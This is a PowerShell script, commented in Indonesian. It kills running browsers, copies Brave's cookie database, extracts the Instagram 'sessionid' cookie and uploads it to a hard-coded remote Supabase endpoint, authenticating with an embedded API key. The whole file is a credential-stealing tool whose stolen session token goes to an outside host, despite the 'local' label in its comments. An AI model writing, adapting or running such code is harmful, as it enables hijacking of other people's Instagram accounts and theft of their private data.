# --- KONFIGURASI SUPABASE LOCAL ---
$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

function Kill-BrowserProcesses {
    Write-Host "[*] Membersihkan proses browser di latar belakang..."
    $browsers = @("brave", "chrome", "msedge", "opera")
    foreach ($b in $browsers) {
        Stop-Process -Name $b -ErrorAction SilentlyContinue -Force
    }
}

function Save-To-Supabase {
    param ([string]$sessionId)
    try {
        Write-Host "[*] Menghubungkan ke Supabase Local..."
        
        $headers = @{
            "apikey"        = $SUPABASE_KEY
            "Authorization" = "Bearer $SUPABASE_KEY"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }
        
        $body = @{
            "session" = $sessionId
        } | ConvertTo-Json

        $response = Invoke-RestMethod -Uri $SUPABASE_URL -Method Post -Headers $headers -Body $body
        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase Local!"
    }
    catch {
        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
    }
}

function Get-InstagramSession {
    Kill-BrowserProcesses

    $dbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
    
    if (-not (Test-Path $dbPath)) {
        # Coba lokasi fallback jika direktori Default tidak ada
        $dbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies"
    }

    if (-not (Test-Path $dbPath)) {
        Write-Host "[!] File database cookie Brave tidak ditemukan."
        return
    }

    # Salin file SQLite ke folder Temp agar tidak terkunci oleh sistem
    $tempDb = "$env:TEMP\brave_cookies_temp.db"
    Copy-Item -Path $dbPath -Destination $tempDb -Force

    Write-Host "[*] Membaca database cookie Brave..."

    # Ekstraksi string binary/text cookie dari file SQLite
    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
    $text = [System.Text.Encoding]::Latin1.GetString($bytes)

    # Hapus file temporary
    Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue

    # Ekstraksi pattern sessionid menggunakan RegEx
    if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
        $rawSession = $Matches[1]
        
        # Sterilisasi string hasil pencarian
        $sessionIdVal = $rawSession -replace '[^\w%:-]', ''

        Write-Host ("=" * 65)
        Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:"
        Write-Host ("=" * 65)
        Write-Host $sessionIdVal
        Write-Host ("=" * 65)`n

        Save-To-Supabase -sessionId $sessionIdVal
    }
    else {
        Write-Host "`n[!] Cookie 'sessionid' Instagram tidak ditemukan."
        Write-Host "[!] Pastikan kamu sudah login ke akun Instagram di Brave."
    }
}

# Jalankan eksekusi utama
Get-InstagramSession
